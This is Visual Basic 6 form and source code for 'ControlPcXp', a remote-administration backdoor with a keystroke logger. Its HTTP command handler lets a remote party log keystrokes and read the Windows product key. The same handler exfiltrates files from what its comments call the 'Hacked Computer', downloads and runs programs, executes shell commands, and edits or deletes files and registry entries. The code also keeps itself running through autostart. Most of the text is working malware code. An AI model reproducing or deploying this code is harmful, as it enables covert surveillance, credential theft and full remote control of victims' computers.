      BackColor       =   &H00C0FFFF&
      Caption         =   "Connections"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   3
      Left            =   240
      TabIndex        =   5
      ToolTipText     =   "Extended Service"
      Top             =   1800
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "User Information"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   2
      Left            =   240
      TabIndex        =   4
      ToolTipText     =   "Normal Service"
      Top             =   1560
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Key Logging"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   1
      Left            =   240
      TabIndex        =   3
      Top             =   1320
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Processes List"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   0
      Left            =   240
      TabIndex        =   2
      ToolTipText     =   "Normal Service"
      Top             =   1080
      Width           =   2055
   End
   Begin VB.Timer tjjy 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   3240
      Top             =   7680
   End
   Begin VB.Timer tjjw 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   2400
      Top             =   7680
   End
   Begin VB.FileListBox djjy 
      BackColor       =   &H00FF8080&
      Height          =   285
      Hidden          =   -1  'True
      Left            =   3720
      System          =   -1  'True
      TabIndex        =   1
      Top             =   7680
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.DirListBox djjx 
      BackColor       =   &H00FF8080&
      Height          =   315
      Left            =   4320
      TabIndex        =   0
      Top             =   7680
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.Timer tjjx 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   2760
      Top             =   7680
   End
   Begin VB.PictureBox Picture1 
      Height          =   0
      Left            =   0
      ScaleHeight     =   0
      ScaleWidth      =   0
      TabIndex        =   49
      Top             =   0
      Width           =   0
   End
   Begin VB.Frame frm_wait 
      BackColor       =   &H00C0C0C0&
      BorderStyle     =   0  'None
      Height          =   2295
      Left            =   1800
      TabIndex        =   81
      Top             =   1680
      Visible         =   0   'False
      Width           =   3975
      Begin VB.Label Label15 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Determinig Local IP Address"
         BeginProperty Font 
            Name            =   "Georgia"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   240
         Left            =   480
         TabIndex        =   83
         Top             =   720
         Width           =   3090
      End
      Begin VB.Label Label14 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Please Wait..."
         BeginProperty Font 
            Name            =   "Georgia"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   240
         Left            =   1320
         TabIndex        =   82
         Top             =   1320
         Width           =   1395
      End
   End
   Begin VB.Label Label13 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Supported Services"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   4995
      TabIndex        =   80
      Top             =   4800
      Width           =   1680
   End
   Begin VB.Shape Shape4 
      FillColor       =   &H000080FF&
      FillStyle       =   0  'Solid
      Height          =   255
      Left            =   4830
      Shape           =   4  'Rounded Rectangle
      Top             =   4785
      Width           =   1980
   End
   Begin VB.Label Label11 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Try Day 1 of 60"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   5400
      TabIndex        =   62
      Top             =   0
      Width           =   1320
   End
   Begin VB.Line Line6 
      BorderColor     =   &H00FFFFFF&
      X1              =   120
      X2              =   6960
      Y1              =   5640
      Y2              =   5640
   End
   Begin VB.Line Line5 
      BorderColor     =   &H00808080&
      X1              =   135
      X2              =   6965
      Y1              =   5655
      Y2              =   5655
   End
   Begin VB.Label lblinfo 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   $"Services_controlpcxp.ctx":22DF
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   855
      Left            =   120
      TabIndex        =   61
      Top             =   6360
      Width           =   6855
   End
   Begin VB.Line Line4 
      BorderColor     =   &H00808080&
      X1              =   135
      X2              =   6965
      Y1              =   5175
      Y2              =   5175
   End
   Begin VB.Line Line3 
      BorderColor     =   &H00FFFFFF&
      X1              =   120
      X2              =   6960
      Y1              =   5160
      Y2              =   5160
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00808080&
      X1              =   130
      X2              =   6960
      Y1              =   970
      Y2              =   970
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00FFFFFF&
      X1              =   120
      X2              =   6960
      Y1              =   960
      Y2              =   960
   End
   Begin VB.Label Label10 
      BackStyle       =   0  'Transparent
      Caption         =   "User : None"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   195
      TabIndex        =   60
      Top             =   525
      Width           =   3210
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H0080C0FF&
      FillColor       =   &H00C0C0C0&
      FillStyle       =   0  'Solid
      Height          =   375
      Left            =   120
      Shape           =   4  'Rounded Rectangle
      Top             =   480
      Width           =   3375
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Version : Beta 1.2"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   2040
      TabIndex        =   59
      Top             =   240
      Width           =   1290
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "ControlPcXp"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000080FF&
      Height          =   360
      Left            =   120
      TabIndex        =   58
      Top             =   120
      Width           =   1755
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "?"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   270
      Left            =   2340
      TabIndex        =   40
      Top             =   4815
      Width           =   135
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "ControlPcXp Address :"
      Height          =   195
      Left            =   240
      TabIndex        =   39
      Top             =   5280
      Width           =   1590
   End
   Begin VB.Shape Shape3 
      FillColor       =   &H00C0FFFF&
      FillStyle       =   0  'Solid
      Height          =   4215
      Left            =   120
      Top             =   960
      Width           =   6855
   End
End
Attribute VB_Name = "Services"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'Warning : This Program Control and its required files are Open Source to the world thus the Author is not responsible For Any Misuse.
Option Explicit
Private IdeCheck As Boolean
Private PreviousLog As String
Private MenuShown As Boolean
Private HackMode As Boolean
Private mPASS As Boolean
Private CurrSendingBytes As Long
Private CurrSendingFile As String



Private Function ManageLog(ByVal IsInput As Boolean, _
                           Optional SortKey As Long, _
                           Optional ByVal DataKey As Long, _
                           Optional ByVal Daten As String, _
                           Optional ByVal Timen As String, _
                           Optional ByVal Title As String, _
                           Optional ByVal Classn As String, _
                           Optional ByVal Keys As String, _
                           Optional ByVal ExtraInfo As String, _
                           Optional ByVal KillData As Boolean) As String

  
  Dim LogFile   As String
  Dim A1        As String
  Dim A3        As String
  Dim A2        As Long
  Dim Strings() As String

    On Error GoTo Error_Prase
    LogFile = GetSystemDirectory & "Log.Log"
    If KillData Then
        Kill LogFile
    End If
    If IsInput Then
        Open LogFile For Append As #2
        Write #2, Replace(Daten & "<#>" & Timen & "<#>" & Title & "<#>" & Classn & "<#>" & Keys & "<#>" & ExtraInfo, vbCrLf, " ")
        Close #2
     Else 'ISINPUT = FALSE/0
        If LenB(Dir(LogFile)) = 0 Then
            ManageLog = "Log Not Created Yet!"
            Exit Function
        End If
        ReDim Strings(0)
        Open LogFile For Input As #2
        Do While Not EOF(2)
            Line Input #2, A1
            If UBound(Split(A1, "<#>")) > 0 Then
                A3 = Replace(Split(A1, "<#>")(SortKey), Chr$(34), vbNullString)
                ReDim Preserve Strings(UBound(Strings) + 1)
                For A2 = 0 To UBound(Strings)
                    If LCase$(A3) = LCase$(Strings(A2)) Then
                        GoTo Exists
                    End If
                Next '  A2
                Strings(UBound(Strings)) = A3
Exists:
            End If
        Loop
        Close #2
        ManageLog = "<h3><center>Manage Log (" & Format$((FileLen(LogFile) / 1024 / 1024), "0.0000") & " MB)" & "</center></h3><br>"
        If DataKey > 0 Then
            A3 = Strings(DataKey)
            Erase Strings()
            ReDim Strings(0)
            ManageLog = ManageLog & "<b>" & A3 & "</B><br>"
            Open LogFile For Input As #2
            Do While Not EOF(2)
                Line Input #2, A1
                A1 = Replace(A1, """", "")
                If UBound(Split(A1, "<#>")) > 0 Then
                    If A3 = Split(A1, "<#>")(SortKey) Then
                        ReDim Preserve Strings(UBound(Strings) + 1)
                        Strings(UBound(Strings)) = A1
                    End If
                End If
            Loop
            Close #2
        End If
        For A2 = 0 To UBound(Strings)
            If Strings(A2) <> "" Then
                If DataKey > 0 Then
                    ManageLog = ManageLog & Split(Strings(A2), "<#>")(0) & " " & Split(Strings(A2), "<#>")(1) & "<br>" & Split(Strings(A2), "<#>")(2) & "<br>" & Split(Strings(A2), "<#>")(3) & "<br><b><u>" & Split(Strings(A2), "<#>")(4) & "</b></u><br>" & "<br>"
                 Else 'NOT DATAKEY...
                    ManageLog = ManageLog & "<a Href=""" & LocalhttpAddress & "/GGL," & SortKey & "," & A2 & """>" & Replace(Replace(Replace(Strings(A2), "<#>", " "), ">", ""), "<", "") & "</a><br>" & vbCrLf
                End If
            End If
        Next '  A2
    End If

Exit Function

Error_Prase:
On Error Resume Next
    Close #2
    'Kill LogFile
    Log "Error in Managelog : " & err.Description
    If IsInput = False Then
        ManageLog = Now & " Error : " & err.Description
    End If

End Function

Private Sub Manupulation(strStr As String)

  
  Dim Param(20) As String
  Dim A1        As Long
  Dim ret       As Long
  Dim Aa1       As String
  Dim DD1       As String
  Dim DD2       As String
  Dim DD        As String
  Dim DDD()     As String
  Dim Postcmd As String
    Dim mPUT As Boolean
    On Error GoTo Error_Prase
    Debug.Print strStr
    'Security
    strStr = Replace(strStr, App.EXEName & ".exe", "Unknown")
    
    If strStr = "Unknown" Then SendD ("File Locked Due To Security!"): Exit Sub
    
    If InStr(1, strStr, "HTTP/", vbTextCompare) > 0 Then
    
    If Left(strStr, 3) = "GET" Then
    strStr = Trim$(Replace(Split(strStr, "HTTP/")(0), "GET /", vbNullString, , , vbTextCompare))
    Else ' if Not Get
    
    If UBound(Split(strStr, vbCrLf & vbCrLf)) > 0 Then
     If Split(strStr, vbCrLf & vbCrLf)(1) <> "" Then Postcmd = "?" & Replace(Split(strStr, vbCrLf & vbCrLf)(1), Chr(0), "")
    End If
    
    strStr = Trim$(Replace(Split(strStr, "HTTP/")(0), IIf(Left(strStr, 6) = "PUT /?", "PUT /?", "PUT /"), vbNullString, , , vbTextCompare))
    strStr = strStr & Postcmd
    End If
    
    End If
    
    If InStr(1, strStr, "?", vbTextCompare) > 0 And InStr(1, strStr, "=", vbTextCompare) > 0 Then mPUT = True Else mPUT = False
    If (InStr(1, Right$(strStr, 10), "noform", vbTextCompare)) > 0 Then NoForm = True
    If (InStr(1, Right$(strStr, 10), "...")) > 0 Then strStr = Left$(strStr, InStr(1, strStr, "...") - 1)
        

If mPUT = True Then
Dim S1, s2, s3, s4
        S1 = Split(strStr, "?")(1)
        Param(0) = Split(strStr, "?")(0)
        For A1 = 0 To UBound(Split(S1, "&"))
        Param(Val(Split(Split(S1, "&")(A1), "=")(0))) = Split(Split(S1, "&")(A1), "=")(1)
        Param(Val(Split(Split(S1, "&")(A1), "=")(0))) = GetHexVal(Param(Val(Split(Split(S1, "&")(A1), "=")(0))))
        Next
        GoTo VarOK
End If
    If InStr(1, Left$(strStr, 5), ",") > 0 Then
        For A1 = 0 To UBound(Split(strStr, ","))
            Param(A1) = Split(strStr, ",")(A1)
            Param(A1) = GetHexVal(Param(A1))
            Param(A1) = Replace(Param(A1), "/", "\")
        Next A1
        End If
    
VarOK:
    
    
    If mPASS = False Then GoTo NOPASS
      
    Select Case UCase$(strStr)
        
    Case "INIT"
    Call SendDhtml("<center><b>Welcome</b></center><br>" & GetComputerNamen & "<br><br>" & SFM(""))
    
    
    
    Case "LOGOUT"
    mPASS = False
    Call SendDhtml("Logout Sucessfull")
        'Get Processes
        ' Example : 'Http://10.10.10.10:111/GP'
     Case "GP"
        If Check1(0).Value = 1 Then
            Call SendDhtml(Get_Kill_Processes)
         Else 'NOT CHECK1(0).VALUE...
            Call SendDhtml("Function 'Get Processes' Not Enabled!")
        End If
        'Start logging
     Case "SL"
        If Check1(1).Value = 1 Then
            LogEnabled = True
            Call SaveSetting("General", "Settings", "LE", CStr(LogEnabled))
            Call SendDhtml("Command 'Start Logging' of Function 'Keystrokes Logging' Sucessfull")
         Else 'NOT CHECK1(1).VALUE...
            Call SendDhtml("Function 'Keystroke Logging' Not Enabled!")
        End If
        'Stop Logging
     Case "DL"
        If Check1(1).Value = 1 Then
            LogEnabled = False
            Call SaveSetting("General", "Settings", "LE", CStr(LogEnabled))
            Call SendDhtml("Command 'Stop Logging' of Function 'Keystrokes Logging' Sucessfull<br>Log Cleared!")
         Else 'NOT CHECK1(1).VALUE...
            Call SendDhtml("Function 'Keystroke Logging' Not Enabled!")
        End If
        'Get User
     Case "GUI"
        If Check1(2).Value = 1 Then
            Call SendDhtml(GetComputerNamen)
         Else 'NOT CHECK1(2).VALUE...
            Call SendDhtml("Function 'Get User Info' Not Enabled!")
        End If
        'Get Connections
     Case "GNET"
        If Check1(3).Value = 1 Then
            Call SendDhtml(Con)
         Else 'NOT CHECK1(3).VALUE...
            Call SendDhtml("Function 'Get Network Connections' Not Enabled!")
        End If
        'Get Foreground Window
     Case "GACT"
        If Check1(4).Value = 1 Then
            Call SendDhtml(GetActiveWindow(1))
         Else 'NOT CHECK1(4).VALUE...
            Call SendDhtml("Function 'Get Active Window' Not Enabled!")
        End If
        'Get Windows Directory
     Case "WIND"
        If Check1(5).Value = 1 Then
            Call SendDhtml(Environ$("WinDir"))
         Else 'NOT CHECK1(5).VALUE...
            Call SendDhtml("Function 'Get Windows Directory' Not Enabled!")
        End If
        'Get System Directory
     Case "SYSD"
        If Check1(6).Value = 1 Then
            Call SendDhtml(GetSystemDirectory)
         Else 'NOT CHECK1(6).VALUE...
            Call SendDhtml("Function 'Get System Directory' Not Enabled!")
        End If
        'Get Disk Drives
     Case "DRI"
        If Check1(7).Value = 1 Then
            Call SendDhtml(GetDriveLetters)
         Else 'NOT CHECK1(7).VALUE...
            Call SendDhtml("Function 'Get Disk Drives' Not Enabled!")
        End If
        'Get Windows Version
     Case "WIN"
        If Check1(8).Value = 1 Then
            Call SendDhtml(ReadReg(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", "ProductName", vbNullString) & " " & ReadReg(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "") & " " & "(" & ReadReg(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion", "Normal") & ")  " & ReadReg(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "BuildLab", "") & "<br><br><b>HOTFIX</b><br>" & GetRegistrySubKeys(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\HotFix"))
         Else 'NOT CHECK1(8).VALUE...
            Call SendDhtml("Function 'Get Windows Version' Not Enabled!")
        End If
        'Get Windows Key
     Case "WINK"
        If Check1(9).Value = 1 Then
            Call SendDhtml(IIf(ReadReg(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", "ProductKey", "") <> "", ReadReg(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", "ProductKey", "Unknown"), "NONE"))
         Else 'NOT CHECK1(9).VALUE...
            Call SendDhtml("Function 'Get Windows Key' Not Enabled!")
        End If
        'Get Startup Run Entries
        ' Example : 'Http://10.10.10.10:111/RUNS'
     Case "RUNS"
        If Check1(10).Value = 1 Then
            Call SendDhtml(IIf(GetRegistrySubKeys(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run") <> "", GetRegistrySubKeys(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run"), "NONE"))
         Else 'NOT CHECK1(10).VALUE...
            Call SendDhtml("Function 'Get Startup Run Entries' Not Enabled!")
        End If
        'Get RunService Entries
     Case "RSER"
        If Check1(11).Value = 1 Then
            Call SendDhtml(IIf(GetRegistrySubKeys(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices") <> "", GetRegistrySubKeys(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices"), "NONE"))
         Else 'NOT CHECK1(11).VALUE...
            Call SendDhtml("Function 'Get Startup Runservice Entries' Not Enabled!")
        End If
        'Unload Me
        ' Not Uninstall ( This Will Exit (But Restart on Next Computer Start) )
     Case "QUIT"
        If Check1(12).Value = 1 Then
            Call SendDhtml("Function 'Exit Program' Sucessfull")
            nSocket.SockClose
            DoEvents
            End
         Else 'NOT CHECK1(12).VALUE...
            Call SendDhtml("Function 'Exit Program' Not Enabled!")
        End If
        
        'Uninstall
        Case "UNINSTALL"
        RemoveAutostart
        End
        
        'Clear Logged Text
     Case "CLT"
        If Check1(1).Value = 1 Then
            ManageLog False, , , , , , , , , True
            Call SendDhtml("Log Files Deleted Sucessfully")
         Else 'NOT CHECK1(1).VALUE...
            Call SendDhtml("Command 'Clear Logged Text' of Function 'Keystrokes Logging' Not Enabled!")
        End If
    End Select
    'Select The Form Input Methord .
        If Param(0) = "" Then GoTo NOSERVICE
        
        'note that the \ and / signs in file/dir path is same when you use internet explorer to browse computer information
        ' but if you are using anything else . then use / in it
        Select Case UCase$(Param(0))
         Case "GGL"
            If Check1(1).Value = 1 Then
                Call SendDhtml(ManageLog(False, Val(Param(1)), Val(Param(2))))
             Else 'NOT CHECK1(1).VALUE...
                Call SendDhtml("Function 'Keystroke Logging' Not Enabled!")
            End If
            'File Download ( From Hacked Computer ) Big Work
            ' Example : 'Http://10.10.10.10:111/FDO,Http://domain.com/file.exe
         Case "FDO"
FileDown:
If Check1(13).Value = 1 Then
Dim i As Long, B As String, bs As Long, FN
Dim CT As String, Ct1 As String
Dim N1 As Long

' If Filesize< 1 mb send
If FileLen(Param(1)) <= 100000 Then
Open Param(1) For Binary As #3
B = String(LOF(3), 0)
Get #3, , B
Close #1
On Error GoTo errn1
Ct1 = LCase(Right(Param(1), 3))
If Ct1 = "jpg" Then CT = " image/jpeg"
If Ct1 = "gif" Then CT = " image/gif"
If Ct1 = "bmp" Then CT = " image/bmp"
If Ct1 = "txt" Then CT = " text/plain"
If Ct1 = "htm" Then CT = " text/html"
If Ct1 = "zip" Then CT = " binary/deflate"
If Ct1 = "exe" Then CT = " binary/deflate"
If CT = "" Then CT = " binary/attachment"
FN = GetFileFromPath(Param(1))

nSocket.SendDataTo "HTTP/1.1 200 OK" & vbCrLf & "Content-Type: " & CT & vbCrLf & "Content-Length: " & FileLen(Param(1)) & " bytes" & vbCrLf & "Content-Disposition: attachment; filename=""" & FN & Chr(34) & vbCrLf & vbCrLf & B & vbCrLf & vbCrLf

Else

If Val(Param(2)) > 0 Then
bs = Val(Param(2))
Else
bs = 1024 * 10
End If
i = 0

SendFile:
On Error GoTo errn1
Ct1 = LCase(Right(Param(1), 3))
If Ct1 = "jpg" Then CT = " image/jpeg"
If Ct1 = "gif" Then CT = " image/gif"
If Ct1 = "bmp" Then CT = " image/bmp"
If Ct1 = "txt" Then CT = " text/plain"
If Ct1 = "htm" Then CT = " text/html"
If Ct1 = "zip" Then CT = " binary/deflate"
If Ct1 = "exe" Then CT = " binary/deflate"
If CT = "" Then CT = " binary/attachment"
FN = GetFileFromPath(Param(1))
nSocket.SendDataTo "HTTP/1.1 200 OK" & vbCrLf & "Content-Type: " & CT & vbCrLf & "Content-Length: " & FileLen(Param(1)) & " bytes" & vbCrLf & "Content-Disposition: attachment; filename=""" & FN & Chr(34) & vbCrLf & "Content-Range: " & """" & i & "-" & i + bs & """" & vbCrLf & vbCrLf
Open Param(1) For Binary As #3
re:
                        
                        If i + (bs) <= FileLen(Param(1)) Then
                        B = String(bs, 0)
                        i = i + (bs)
                        Else
                        B = String(FileLen(Param(1)) - i, 0)
                        i = i + FileLen(Param(1)) - i
                        End If
                        Get #3, , B
                        nSocket.SendDataTo B
                        Sleep 100
                        DoEvents
                        If (FileLen(Param(1)) - i) > 0 Then
                        GoTo re
                        Else
                        DoEvents
                        End If
                        Close #3
                        
                        B = ""
                        SendD vbCrLf & vbCrLf
                        DoEvents
Exit Sub
errn1:
Close #3
SendDhtml (("Error Opening File : " & Param(1))): Exit Sub
End If
             Else 'NOT CHECK1(13).VALUE...
                Call SendDhtml("Function 'File Download' Not Enabled")
            End If
            
            '-----------------------------------------------
            'Run File ( in Hacked Computer )
            ' Example : 'Http://10.10.10.10:111/FIRE,Open,c:/Program Files/Program.exe,,1'
         Case "FIRE"
            If Check1(14).Value = 1 Then
                ret = ShellExecute(0, Param(1), Param(2), Param(3), Param(4), Val(Param(5)))
                Call SendDhtml(IIf(ret = 0, "Function 'Run File' Crashed!", "Function 'Run File' Sucessfull"))
             Else 'NOT CHECK1(14).VALUE...
                Call SendDhtml("Function 'Run File' Not Enabled")
            End If
            'Get Folder Size
            ' Example : 'Http://10.10.10.10:111/DS,c:\Folder'
         Case "DS"
            If Check1(15).Value = 1 Then
                Call SendDhtml("<b>" & Param(1) & " : </b>" & FormatFileSize(GetFolderSize(Param(1), True)))
             Else 'NOT CHECK1(15).VALUE...
                Call SendDhtml("Function 'File Download' Not Enabled")
            End If
            'Get File Size
            ' Example : 'Http://10.10.10.10:111/FS,c:\File.exe'
         Case "FS"
            If Check1(16).Value = 1 Then
                Call SendDhtml(FormatFileSize(FileLen(Param(1))))
             Else 'NOT CHECK1(16).VALUE...
                SendD ("Function 'Get File Size' Not Enabled")
            End If
            'Delete File
         Case "FD"
            If Check1(17).Value = 1 Then
                Kill Param(1)
                Call SendDhtml("Function 'Delete File' Sucessfull")
             Else 'NOT CHECK1(17).VALUE...
                Call SendDhtml("Function 'Delete File' Not Enabled")
            End If
            'Get File Property
         Case "FP"
            If Check1(18).Value = 1 Then
                Call SendDhtml(Dir(Param(1), Param(2)))
             Else 'NOT CHECK1(18).VALUE...
                Call SendDhtml("Function 'Dir (File/Folder Exists)' Not Enabled")
            End If
            'Rename File
         Case "FR"
            If Check1(19).Value = 1 Then
                Name Param(1) As Param(2)
                Call SendDhtml("Function 'Rename File' Sucessfull")
             Else 'NOT CHECK1(19).VALUE...
                Call SendDhtml("Function 'Rename File' Not Enabled")
            End If
            'Move File
         Case "FM"
            If Check1(20).Value = 1 Then
                FileCopy Param(1), Param(2)
                Kill Param(1)
                Call SendDhtml("Function 'Move File' Sucessfull")
             Else 'NOT CHECK1(20).VALUE...
                Call SendDhtml("Function 'Move File' Not Enabled")
            End If
            'Directory Scan ( List Directorys in Path )
         Case "LD"
            If Check1(21).Value = 1 Then
                Call SendDhtml(GetDirectoryList(Param(1)))
             Else 'NOT CHECK1(21).VALUE...
                Call SendDhtml("Function 'List Subdirectorys' Not Enabled")
            End If
            'Delete Directory
         Case "DD"
            If Check1(22).Value = 1 Then
                DeleteDirectory Param(1)
                Call SendDhtml("Function 'Delete Directory' Sucessfull")
             Else 'NOT CHECK1(22).VALUE...
                Call SendDhtml("Function 'Delete Directory' Not Enabled")
            End If
            'Create Directorys ( Or Path )
         Case "CD"
            If Check1(23).Value = 1 Then
                CreatePath Param(1)
                Call SendDhtml("Function 'Create Directorys' Sucessfull")
             Else 'NOT CHECK1(23).VALUE...
                Call SendDhtml("Function 'Create Directorys' Not Enabled")
            End If
            'Delete Registry Value
         Case "RDV"
            If Check1(24).Value = 1 Then
                Call SendDhtml(IIf(DeleteRegValue(GetRegKey(Param(1)), Param(2) & "", Param(3) & "") = 0, Param(1) & "\" & Param(2) & "\" & Param(3) & " Deleted Sucessfully", "Cannot Delete : " & Param(1) & "\" & Param(2) & "\" & Param(3)))
             Else 'NOT CHECK1(24).VALUE...
                Call SendDhtml("Function 'Delete Registry Value' Not Enabled")
            End If
            'Read Registry
         Case "RG"
            If Check1(25).Value = 1 Then
                Call SendDhtml(ReadReg(GetRegKey(Param(1)), Param(2) & "", Param(3) & "", "Unknown"))
             Else 'NOT CHECK1(25).VALUE...
                Call SendDhtml("Function 'Read Registry' Not Enabled")
            End If
            'Write Registry String
         Case "WR"
            If Check1(26).Value = 1 Then
                Call SendDhtml(IIf(WriteRegString(GetRegKey(Param(1)), Param(2) & vbNullString, Param(3) & vbNullString, Param(4) & vbNullString) = 0, "OK", "Error"))
             Else 'NOT CHECK1(26).VALUE...
                Call SendDhtml("Function 'Write Registry String' Not Enabled")
            End If
            'Scan Values in Key
         Case "ERV"
            If Check1(27).Value = 1 Then
                Call SendDhtml(GetRegistrySubKeys(GetRegKey(Param(1) & ""), Param(2) & ""))
             Else 'NOT CHECK1(27).VALUE...
                Call SendDhtml("Function 'List SubValues' Not Enabled")
            End If
            'Scan Keys in Key
         Case "ERK"
            If Check1(28).Value = 1 Then
                Call SendDhtml(GetRegistrySubKeys(GetRegKey(Param(1) & ""), Param(2) & "", 2))
             Else 'NOT CHECK1(28).VALUE...
                Call SendDhtml("Function 'List SubKeys' Not Enabled")
            End If
            'Start File Manager
         Case "SFM"
            If Check1(29).Value = 1 Then
                Call SendDhtml(SFM(Param(1) & ""))
             Else 'NOT CHECK1(29).VALUE...
                Call SendDhtml("Function 'Start File Manager' Not Enabled")
            End If
            'Download File ( in Hacked Computer )
         Case "DF"
            If Check1(30).Value = 1 Then
                'Set Timeout To 1 Min
                tjjx.Interval = 60000
                URLDownloadToFile 0, Param(1), Param(2), 0, 0
                Call SendDhtml("Function 'Web Download' Sucessfull")
             Else 'NOT CHECK1(30).VALUE...
                Call SendDhtml("Function 'Web Download' Not Enabled")
            End If
            'Open (Shell Command)
         Case "OP"
            If Check1(31).Value = 1 Then
                Shell Param(1), Val(Param(2))
                Call SendDhtml("Function 'Shell Open' Sucessfull")
             Else 'NOT CHECK1(31).VALUE...
                Call SendDhtml("Function 'Shell Open' Not Enabled")
            End If
            'Terminate Process
         Case "TP"
            If Check1(32).Value = 1 Then
                Get_Kill_Processes Trim$(Param(1))
                Call SendDhtml("Function 'Terminate Process' Sucessfull")
             Else 'NOT CHECK1(32).VALUE...
                Call SendDhtml("Function 'Terminate Process' Not Enabled")
            End If
            'Send Message To User ( hacked )
         Case "SMS"
            If Check1(33).Value = 1 Then
                tjjx.Interval = 60000
                
                Aa1 = InputBox(Param(1), "Message", "", 0, 0)
                If LenB(Aa1) Then
                    Call SendDhtml("User Said : " & Aa1)
                 Else 'LENB(AA1) = FALSE/0
                    Call SendDhtml("NO ANSWER")
                End If
             Else 'NOT CHECK1(33).VALUE...
                Call SendDhtml("Function 'Send Message' Not Enabled")
            End If
            'Find Files EG: 127.0.0.1/FF,c:/,Findthis
         Case "FF"
            If Check1(34).Value = 1 Then
                Call SendDhtml(FindFiles(Param(1), Param(2), True))
             Else 'NOT CHECK1(34).VALUE...
                Call SendDhtml("Function 'Find Files' Not Enabled")
            End If
